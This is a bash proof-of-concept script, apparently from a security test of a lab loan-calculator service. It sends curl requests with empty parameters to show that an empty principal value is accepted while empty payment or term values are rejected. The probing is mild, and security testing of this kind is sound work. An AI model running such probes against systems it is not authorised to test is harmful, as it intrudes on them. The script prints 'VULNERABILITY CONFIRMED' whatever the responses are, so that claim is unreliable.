#!/bin/bash

# POC: Input Validation Bypass - Empty Principal Parameter Accepted
# Demonstrates that the /total_loan_payments endpoint accepts empty principal
# while rejecting empty payment and term parameters

TARGET_URL="${1:-http://localhost:32768}"
ENDPOINT="/total_loan_payments"

echo "============================================"
echo "Input Validation Bypass POC"
echo "============================================"
echo "Target: $TARGET_URL$ENDPOINT"
echo ""

# Test 1: Empty principal parameter (should be rejected but is accepted)
echo "[TEST 1] Empty principal parameter (should fail but doesn't):"
echo "Request: principal=&payment=100&term=12"
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT?principal=&payment=100&term=12")
echo "Response: $RESPONSE"
echo ""

# Test 2: Empty payment parameter (properly rejected)
echo "[TEST 2] Empty payment parameter (properly rejected):"
echo "Request: principal=10000&payment=&term=12"
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT?principal=10000&payment=&term=12")
echo "Response: $RESPONSE"
echo ""

# Test 3: Empty term parameter (properly rejected)
echo "[TEST 3] Empty term parameter (properly rejected):"
echo "Request: principal=10000&payment=100&term="
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT?principal=10000&payment=100&term=")
echo "Response: $RESPONSE"
echo ""

# Test 4: Valid request for comparison
echo "[TEST 4] Valid request (all parameters present):"
echo "Request: principal=10000&payment=100&term=12"
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT?principal=10000&payment=100&term=12")
echo "Response: $RESPONSE"
echo ""

echo "============================================"
echo "VULNERABILITY CONFIRMED:"
echo "- Empty principal is accepted (should reject)"
echo "- Empty payment is rejected (correct behavior)"
echo "- Empty term is rejected (correct behavior)"
echo "- Inconsistent validation allows principal bypass"
echo "============================================"